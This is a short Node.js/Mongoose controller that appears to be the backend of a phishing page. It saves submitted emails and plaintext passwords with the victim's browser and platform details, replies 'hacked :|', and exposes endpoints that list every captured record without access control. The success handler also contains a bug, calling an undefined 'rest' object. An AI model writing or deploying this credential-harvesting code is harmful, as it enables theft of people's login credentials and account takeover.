const mongoose = require('mongoose');

const Schema = new mongoose.Schema({
    email: String,
    password: String,
    userAgent: String,
    platform: String,
    date: { type: Date, default: Date.now }
});

const User = mongoose.model('eig_user', Schema);

const save = (req, res) => {
    console.log(req.body);
    new User({
        email: req.body.email,
        password: req.body.password,
        userAgent: req.body.userAgent,
        platform: req.body.platform
    })
        .save()
        .then(data => rest.status(200).json({ message: 'hacked :|' }))
        .catch(err => console.error(err));
}

const getById = (req, res) => {
    User.findById(req.params.id)
        .then(data => res.status(200).json(data))
        .catch(err => console.error(err));
}

const getAll = (req, res) => {
    User.find()
        .then(data => res.status(200).json(data))
        .catch(err => console.error(err));
}

module.exports = {
    save,
    getAll,
    getById
}